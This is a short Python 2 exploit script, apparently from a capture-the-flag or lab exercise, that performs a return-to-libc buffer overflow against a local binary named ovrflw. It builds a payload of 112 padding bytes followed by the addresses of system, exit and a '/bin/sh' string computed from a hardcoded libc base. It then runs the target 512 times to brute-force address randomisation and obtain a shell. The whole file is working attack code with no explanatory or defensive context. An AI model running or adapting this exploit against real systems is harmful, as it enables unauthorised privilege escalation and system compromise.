from subprocess import call
import struct

libc_base_addr = 0xb7593000

system_off = 0x00040310		# Address of system
exit_off = 0x00033260		# Address of exit
arg_off = 0x00162bac		# Address of /bin/sh

system_addr = struct.pack("<I",libc_base_addr+system_off)
exit_addr = struct.pack("<I",libc_base_addr+exit_off)   
arg_addr = struct.pack("<I",libc_base_addr+arg_off)    

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

i = 0
while (i < 512):
	print "Try: %s" %i
	i = i + 1
	ret = call(["/usr/local/bin/ovrflw", buf])
